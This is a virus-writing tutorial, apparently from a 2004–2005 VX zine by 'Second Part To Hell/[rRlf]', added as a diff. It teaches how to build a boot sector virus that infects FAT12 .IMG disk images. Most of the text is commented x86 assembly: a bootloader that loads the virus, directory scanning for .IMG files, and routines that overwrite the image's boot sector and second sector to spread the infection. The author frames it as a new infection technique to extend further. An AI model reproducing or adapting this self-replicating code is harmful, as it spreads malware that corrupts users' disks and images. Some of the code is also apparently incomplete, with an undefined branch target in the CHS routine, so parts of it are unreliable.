@@ -1,0 +1,487 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************    New era of bootsectorviruses #1:  ***********
+          ************      FAT12 IMG infection at Disks    ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro
+
+  1) Theory / Idea
+
+  2) Bootloader
+
+  3) Root_Directory
+
+  4) Find infectable files
+
+  5) The Infection
+
+  6) Last words
+
+
+
+
+
+  0) Intro
+
+     Bootsector viruses were the first form of computerviruses.  They were most
+     widespread from  the  beginning  of  computerviruses  until  December 1995
+     (according to VirusBulletin).  But then, Macroviruses (CAP, ColdApe, ...),
+     Scriptviruses  (Kak, LoveLetter, ...)  and  finally Win32 viruses (Sircam,
+     Klez, Mydoom, Netsky, ...)  were even more widespread,  and the production
+     of bootsectorviruses decreased to nearly zero. A reason for that could be,
+     that it's damn hard  (if not impossible)  writing a bootsectorvirus, which
+     stays in memory while the OS  (Windows)  loads. How did the old bootsector
+     viruses work? When booting from an  infected  Disk,  such  a  virus  first
+     infects the MBR  (Master Boot Record)  of the HD and the bootsector of the
+     first partition. Then it stays in memory,  let the OS load processing, and
+     hooks  (most times?)  INT 0x21 for  checking Disk access. OK, and what the
+     hell will be the different between  the old  style of bootsector infectors
+     and my once?  My idea is to infect the  Images  of Disks/HDs/CD-ROMs.  For
+     that we don't need the INT 0x21, because we use our own File System driver
+     (in this article here FAT12).  For writing our own File System driver it's
+     of course nessecary to fully understand how the system works. For my first
+     article about new bootsectorviruses I'm using FAT12, because it's the most
+     easy of all as far as I know. As FAT12 is just used for DISK,  the article
+     is just about .IMG file infection.  IMG files are  1:1 images of Disks. As
+     you may know, I wanted to infect CD-ROM Bootsectors, but that did not work
+     with Disks,  because ISO or NRI files are at least  2MB as far as I  know.
+     Anyway,  let's start with FAT12 IMG bootsector infectors,  next time let's
+     move to CD-ROMs, ok? :D
+
+
+
+
+
+  1) Theory / Idea
+
+     The virus we will write is a Bootinfector for IMG files.  Well, how should
+     that work?  When A user boots from an infected Disk, the bootloader in the
+     first sector (bootsector) will load the rest of the virus  (here it's just
+     one more sector). The virus will read the Root_Directory, find .IMG files,
+     check  if they are  FAT12  files with the right size,  and then infect the
+     them. Nothing difficult you may think? Haa, let's go on...
+
+
+
+
+
+  2) Bootloader
+
+     What shall our bootloader can?  Of course, changing the  important values,
+     that the processor can even work with the code.  Then?  Loading the second
+     sector of the Disk,  which contains our virus,  and then run it.  There is
+     one more important thing you have to notice:  The FAT12 System Information
+     (is that the correct name? i don't know)  at offset 0x4 of the 1st sector.
+     If you don't have this informations in your bootsector,  the disk won't be
+     able to save/read/write/create/run/whatever files. Well, everything should
+     be understandable, now let's move to the source.  The source is commented,
+     so everything else will be explained by comments:
+
+ - - - - - - - - - - - - - [ Bootloader - Source ] - - - - - - - - - - - - -
+	org 0x7c00				; The Bootsector will be loaded at offset 0x7c00
+stfat:						; Start of Bootsector
+ jmp		 start				; Jump over FAT12 Table
+ nop						; NOP, because jmp=3 byte, FAT-Table starts at 0x4
+ db 0x4D,0x53,0x44,0x4F,0x53,0x35,0x2E,0x30
+ db 0x00,0x02,0x01,0x01,0x00,0x02,0xE0,0x00	; This is the FAT Table of an formated Disk.
+ db 0x40,0x0B,0xF0,0x09,0x00,0x12,0x00,0x02	; At this point a big thanks to Microsoft :)
+ db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00	; And big thanks to Hexeditor!
+ db 0x00,0x00,0x00,0x29,0x8C,0x22,0x2F,0x7C
+ db 0x4E,0x4F,0x20,0x4E,0x41,0x4D,0x45,0x20
+ db 0x20,0x20,0x20,0x46,0x41,0x54,0x31,0x32
+ db 0x20,0x20,0x20
+
+
+start:
+	cli					; No Interrupts
+	mov	ax,0x9000			; Offset of Stack, which we create now.
+	mov	ss, ax				; As we can't change ss directly, we use ax.
+	mov	sp, 0				; Stackpointer
+	sti					; Allow Interrupts
+
+	mov	[bootdrv], dl			; Save bootdisk
+
+loada:
+	push	ds				; Save DS
+	mov	ax, 0				; RESET DISK SYSTEM
+	mov	dl, [bootdrv]			; drive (if bit 7 is set both hard disks and floppy disks reset)
+	int	0x13				; Interrupt 0x13
+	pop	ds				; Restore DS
+	jc	loada				; If carry, again!
+
+
+load1:						; Let's read the second sector (virus)
+	mov	ax, 0x1000			; Data will be saved in memory at ES:BX
+	mov	es, ax				; ES=0x1000
+	mov	bx, 0				; BX=0
+	mov	ah, 0x2				; READ SECTOR(S) INTO MEMORY
+	mov	al, 0x1				; number of sectors to read
+	mov	cx, 2				; CL=Start at sectornummer (2), CH=Cylinder Number
+	mov	dx, 0				; Head/Drive number=0
+	int	0x13				; Interrupt 0x13
+	jc	load1				; If carry, again!
+
+	mov	ax, 0x1000			; AX=0x1000
+	mov	es, ax				; Extra Segment=0x1000
+	mov	ds, ax				; Data Segment=0x1000
+	push	ax				; AX to Stack
+	mov	ax, 0				; AX=0
+	push	ax				; AX to Stack. Stack now looks like that: 0x1000 0x0000
+	retf					; Jump to 32 bit value from Stack: Offset of virus
+
+	bootdrv db 0				; 1 Byte buffer for Bootdrive
+
+ende:
+	times (512-(ende-stfat)-2) db 0		; Rest of the Sector sub 2 = 0 (last 2 byte are boot-marks)
+	dw 0xAA55				; Bootmarks. If you dont use them, BIOS dont boot from that Disk
+ - - - - - - - - - - - - - [ Bootloader - Source ] - - - - - - - - - - - - -
+
+     This bootloader, started from a Disk,  loads the second physical sector of
+     the disk  to the memory  at offset  0x1000.  The bootloader  also creats a
+     stack at the offset 0x9000.  Everything should be clear now I think. A big
+     'Thank you!' for the bootloader information goes to mastermesh (a hobby-OS
+     coder). Thanks for your article in LowLevel#1!
+
+
+
+
+
+  3) Root_Directory
+
+     The Root_Directory is the first directory of the Disk. Normally (always?),
+     the Root_Directory starts at the 20th sector (Head=1/Sector=1). Here files
+     are saved.  A file entry contains 0x20  (32)  bytes.  To understand the 32
+     byte, let's look at the following table:
+
+     * Offset   * Length    * Name                 *
+     ***********************************************
+     * 0x0      * 11 Byte   * DIR_Name             *
+     * 0xB      * 1 Byte    * DIR_Attribute        *
+     * 0xC      * 1 Byte    * DIR_NTRes            *
+     * 0xD      * 1 Byte    * DIR_CrtTimeTenth     *
+     * 0xE      * 2 Byte    * DIR_CrtTime          *
+     * 0x10     * 2 Byte    * DIR_CrtDate          *
+     * 0x12     * 2 Byte    * DIR_LstAccDate       *
+     * 0x14     * 2 Byte    * DIR_FstClusHi        *
+     * 0x16     * 2 Byte    * DIR_WrtTime          *
+     * 0x18     * 2 Byte    * DIR_WrtDate          *
+     * 0x1A     * 2 Byte    * DIR_FstClustLo       *
+     * 0x1C     * 4 Byte    * DIR_FileSize         *
+     ***********************************************
+
+     DIR_Name:
+         This value contains the Filename of the entry. I dont speak about long
+         because we dont need them. If the first byte of the DIR_Name=0x0, then
+         it's the end of the entries.  If the first byte of DIR_Name=0xE5, then
+         it's a deleted file. If the 3rd byte=0x0, then we also ignore it (some
+         thing with long filename).  Important for us is, that the last 3 bytes
+         (starts at 0x8) are the fileextansion.  The filenames are saved UPPER-
+         case and WITHOUT a dot ('.') between filename and extansion. There are
+         some more information about DIR_Name available,  but it's totally  un-
+         important for us.
+
+     DIR_Attribute:
+         This is the Attribute Byte of the file, as you can see from the name:
+
+         0x01 ... ATTR_READ_ONLY
+         0x02 ... ATTR_HIDDEN
+         0x04 ... ATTR_SYSTEM
+         0x08 ... ATTR_VOLUME_ID
+         0x10 ... ATTR_DIRECTORY
+         0x20 ... ATTR_ARCHIVE
+
+         We just need to check, if the Byte is 0x10 (ATTR_DIRECTORY). As we can
+         not infect a directory, we have to leave that entry.
+
+     DIR_NTRes, DIR_CrtTimeTenth, DIR_CrtTime, DIR_CrtDate, DIR_LstAccDate,
+     DIR_FstClusHi, DIR_WrtTime, DIR_WrtDate
+         100% unimportant and unneccessary to explain!
+
+     DIR_FstClustLo
+         Here we get the number of the first data-sector of the File.  But it's
+         not the real one,  we have to add  the number of the  first datasector
+         to get the real one.
+
+     DIR_FileSize
+         The Filelength of the File. Nothing more to explain, but important for
+         the virus.
+
+
+
+
+
+  4) Find infectable files
+
+     Now we know all the damn shit theory about it (I dont like learning the 
+     theory, praxis is better), how can we use it? What to do?
+     First, we have to read the Root_Directory:
+
+ - - - - - - - - - - - - - [ Read Root_Directory ] - - - - - - - - - - - - -
+	mov	ax, 0x2000	; ax=0x2000
+	mov	es, ax		; Data will be read to ES:BX, ES=0x2000
+	mov	ds, ax
+	xor	bx, bx		; BX=0x0
+
+loadk:
+	mov	ah, 0x2 	; ah=2: Read Sectors
+	mov	al, 0x12	; How many Sectors (18)
+	mov	ch, 0		; Cylinder 0
+	mov	cl, 1		; Start at sektor 1
+	xor	dx, dx		; dx=0
+	inc	dh		; Head 1
+	int	0x13		; System call
+	jc	loadk		; If carry, again
+
+	mov	bx, 0x200	; bx=Offset of 2nd Sector in memory
+ - - - - - - - - - - - - - [ Read Root_Directory ] - - - - - - - - - - - - -
+
+     We have the Root_Directory now at ES:BX - 0x2000:0x200. BX is the pointer
+     to the Root_Directory. Next step is to check, if any file is an infectable
+     file:
+
+ - - - - - - - - - - - - - [ Check Infectable File ] - - - - - - - - - - - - -
+fat12read:
+	mov	ah, [bx]	; ah=First byte of Filename
+	cmp	ah, 0x0 	; Check if zero. If zero, it's the last entry
+	je	endfat12read	; If End, stopp reading
+	cmp	ah, 0xE5	; Check if the byte is 0xE5. If so, it's a deleted file
+	je	fat12next	; If deleted file, get next entry
+
+	mov	al, [bx+2]	; al=3rd letter of name
+	test	al, al		; Check if zero
+	jz 	fat12next	; If zero, get next entry
+
+	mov	ax, word [bx+8]		; 9th and 10th Letter to ax
+	cmp	ax, 'IM'		; Check if it's 'IM'
+	jne	fat12next		; If not, no IMG file
+	mov	al, byte [bx+10]	; Move 10th letter to al
+	cmp	al, 'G'			; Check if 10th letter='G'
+	jne	fat12next		; If not, next file
+
+	mov	ax, word [bx+30]	; Move second (high) word of filesize to ax
+	test	ax, ax			; Check if zero
+	jnz	fat12sizeok		; If not zero, file has at least 128 sectors
+
+	mov	al, byte [bx+29]	; Move second byte of low word of filesize to ax
+	cmp	al, 4			; Compair with 4
+	jl	fat12next		; If less than 4, file has not 2 sectors=too small for infection
+
+	mov	al, byte [bx+11]	; Move attribute byte to al
+	and	al, 0x10		; ???1 ???? = Directory
+	test	al, al			; Check if zero
+	jnz	fat12next		; If not zero, it's a directory and we ignore it
+
+	call	INFECTION		; We have a file!!!
+
+  fat12next:
+	mov	cx, 0x2000		; cx=0x2000
+	mov	es, cx			; Data will be read to ES:BX, ES=0x2000
+	mov	ds, cx
+
+	add	bx, 0x20		; Next entry
+jmp  fat12read
+ - - - - - - - - - - - - - [ Check Infectable File ] - - - - - - - - - - - - -
+
+     If the entry was OK, we have an infectable file... nearly. We also have to
+     check, if it's a FAT12  .IMG file.  But this will be in the  next chapter,
+     because we could do it together with modiefying the first sector.
+
+
+
+
+
+  5) The infection
+
+     Now we have to read the file,  then check if it's a FAT12 Image. If so, we
+     can modiefy the bootsector  (that it loads the virus)  and overwriting the
+     second sector. That's all? Yes, it is :)
+
+ - - - - - - - - - - - - [ Check/Modiefy 1st Sector ] - - - - - - - - - - - -
+fat12sizeok:
+	mov	ax, word [bx+25]	; normally: 'mov ax, word [bx+26]' but that stupid shit did...
+	xchg	al, ah			; ...not work, I dont know why and I dont want to know why. I spent...
+	mov	ah, byte [bx+27]	; ...hours of testing, but no result. Let's never ever talk again about that lines, ok?
+
+	add	ax, 32			; Now we have the real 1st data-sector of the file at the disk
+
+	xor	cx, cx			; ch will be the number of the Cylinder
+					; cl will be the number of the Sector
+	xor	dx, dx			; dh will be the number of the Head
+	call	CyHeSe			; Get the Cylinder, Head and Sector
+
+	push	bx			; Save bx at stack
+
+	mov	bx, 0x3000		; ax=0x3000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
+	mov	ds, bx
+	mov	bx, 0			; BX=0x0
+
+	mov	ah, 0x2 		; AH=2: Read Sector
+	mov	al, 0x1 		; Wir read 1 Sector
+	mov	dl, 0
+	int	0x13			; Interrupt 13
+
+	mov	ax, word [bx+54]	; For FAT12 it should be 'FA'
+	cmp	ax, 'FA'		; Check if 'FA'
+	jne	fat12next		; If not, get next file
+
+	mov	ax, word [bx+57]	; For FAT12 it should be '12'
+	cmp	ax, '12'		; Check if '12'
+	jne	fat12next		; If not, get next file
+
+	xor	di, di			; di=0
+	mov	ax, 0xEB3C		; ax=2 bytes of jmp over fat12
+	stosw				; Store AX at address ES:DI
+	mov	al, 0x90		; al = NOP
+	stosb				; Store AL at address ES:DI
+
+	mov	ax, 0x1000		; AX=0x2000
+	mov	ds, ax			; DS=0x2000
+	mov	cx, 63			; Length of 1st sector data
+	mov	si, data1stsector	; Where the data is
+	mov	di, 0x3E		; The FAT12 at 1st sector in IMG file
+	rep	movsb			; Move CX bytes from DS:SI to ES:DI
+					; Move 63 bytes from 0x1000:data1stsector to 0x3000:0x3E
+
+	pop	bx			; Get bx again
+	push	bx			; Save it again
+
+
+	mov	ax, 0x2000		; ax=0x2000
+	mov	es, ax			; Data will be read to ES:BX, ES=0x2000
+	mov	ds, ax
+
+	mov	ax, word [bx+25]	; normally: 'mov ax, word [bx+26]' but that stupid shit did...
+	xchg	al, ah			; ...not work, I dont know why and I dont want to know why. I spent...
+	mov	ah, byte [bx+27]	; ...hours of testing, but no result. Let's never ever talk again about that lines, ok?
+
+	add	ax, 32			; Now we have the real 1st data-sector of the file at the disk
+
+	xor	cx, cx			; ch will be the number of the Cylinder
+					; cl will be the number of the Sector
+	xor	dx, dx			; dh will be the number of the Head
+	call	CyHeSe			; Get the Cylinder, Head and Sector
+
+	mov	ax, 0x3000		; ax=0x3000
+	mov	es, ax			; Data will be read to ES:BX, ES=0x3000
+	mov	ds, ax
+	xor	bx, bx			; BX=0
+
+	mov	ah, 0x3 		; AH=3: Write Sector
+	mov	al, 0x1 		; Wir read 1 Sector
+	mov	dl, 0
+	int	0x13			; Interrupt 13
+
+	mov	bx, 0x2000		; ax=0x2000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
+	mov	ds, bx
+
+	pop	bx			; Restore bx
+
+	jmp	fat12ow2sec		; Jmp over data
+
+
+;	jmpoverfat12	db 0xEB,0x3C,0x90	; Jmp over FAT12 at 0x0 in Sector 1
+	
+	data1stsector	db 0xFA,0xB8,0x00,0x90,0x8E,0xD0,0xBC,0x00,0x00,0xFB	; This is the data after
+			db 0x88,0x16,0x7C,0x7C,0x1E,0xB8,0x00,0x00,0x8A,0x16	; the FAT12. Starts at
+			db 0x7C,0x7C,0xCD,0x13,0x1F,0x72,0xF3,0xB8,0x00,0x10	; offset 0x3E (62) and
+			db 0x8E,0xC0,0xBB,0x00,0x00,0xB4,0x02,0xB0,0x01,0xB9	; has 63 byte.
+			db 0x02,0x00,0xBA,0x00,0x00,0xCD,0x13,0x72,0xEA,0xB8
+			db 0x00,0x10,0x8E,0xC0,0x8E,0xD8,0x50,0xB8,0x00,0x00
+			db 0x50,0xCB,0x00
+ - - - - - - - - - - - - [ Check/Modiefy 1st Sector ] - - - - - - - - - - - -
+
+     Everything understandable? You can see there is a call to a function named
+     'CyHeSe'. I will explain: When using INT 0x13 - AH=0x2/3 (READING/WRITING)
+     you have to  give exact infors  about which Sector,  which Head and  which
+     Cylinder.  But if we just have the Sectornumber,  we have to calculate the
+     CHS by ourself. Here is the function:
+
+ - - - - - - - - - - - - - - - - - [ CHS ] - - - - - - - - - - - - - - - - -
+CyHeSe:
+	cmp	ax, 36				; 36 Sectors = 1 Cylinder
+	jge	BefCyHeSe			; If greater or equal, jmp to BefCyHeSe
+
+	cmp	ax, 18				; 18 Sectors = Head1
+	jl	SecCheck			; If less, Head=0
+	mov	dh, 1				; Head++
+	sub	ax, 18				; Sectors-=18
+   SecCheck:
+	mov	cl, al				; cl=Rest Sector Numbers
+ret
+ - - - - - - - - - - - - - - - - - [ CHS ] - - - - - - - - - - - - - - - - -
+
+     Now, in the end, let's overwrite the second sector of the FAT12 Image file
+     and we have finished our work:
+
+ - - - - - - - - - - - - - [ Overwrite 2nd Sector ] - - - - - - - - - - - - -
+fat12ow2sec:
+	mov	ax, word [bx+25]	; normally: 'mov ax, word [bx+26]' but that stupid shit did...
+	xchg	al, ah			; ...not work, I dont know why and I dont want to know why. I spent
+	mov	ah, byte [bx+27]	; hours of testing, but no result. Let's never ever talk again about that lines, ok?
+
+	add	ax, 32+1		; Now we have the real 2nd data-sector of the file at the disk
+
+	xor	cx, cx			; ch will be the number of the Cylinder
+					; cl will be the number of the Sector
+	xor	dx, dx			; dh will be the number of the Head
+	call	CyHeSe			; Get the Cylinder, Head and Sector
+
+	push	bx			; Save bx at stack, because it will be changed
+
+	mov	bx, 0x1000		; bx=0x1000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
+	mov	ds, bx
+	mov	bx, 0			; BX=0x0
+
+	mov	ah, 0x3 		; AH=3: Write sector(s)
+	mov	al, 0x1 		; We write 1 sector
+	mov	dl, 0
+	int	0x13			; Interrupt 13
+
+	mov	bx, 0x2000		; bx=0x2000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
+	mov	ds, bx
+
+	pop	bx			; Restore bx
+ - - - - - - - - - - - - - [ Overwrite 2nd Sector ] - - - - - - - - - - - - -
+
+     Finished!!! :)
+
+
+
+
+
+  6) Last words
+
+     Woow, it's 4.32 am, and I'm still awake :) This article is the explanation
+     of some main points of my new strange idea: 'New era of bootsectorviruses'
+     This is, as far as I know, a really new field (infecting the bootsector of
+     image files),  and there is much more to do.  Next may be ISO infection at
+     FAT32 partition.  The first CD-ROM Bootsectorvirus - doesn't it also sound
+     like a mystery for you?  Maybe we may also support NTFS or EXT2FS or other
+     file systems?  Who knows?  I just know that this technique,  even it's not
+     a high-speed spreading technique,  is cool  for discovering  and learning,
+     and hey,  do you know what you can do with the HD, if you are alone in the
+     memory? EVERYTHING!!! :)
+
+
+                                                  - - - - - - - - - - - - - - -
+                                                    Second Part To Hell/[rRlf]  
+                                                    www.spth.de.vu
+                                                    spth@priest.com
+                                                    written from Dec 2004 - Jan 2005
+
+                                                    ...surrealistic viruswriter...
+                                                  - - - - - - - - - - - - - - - 
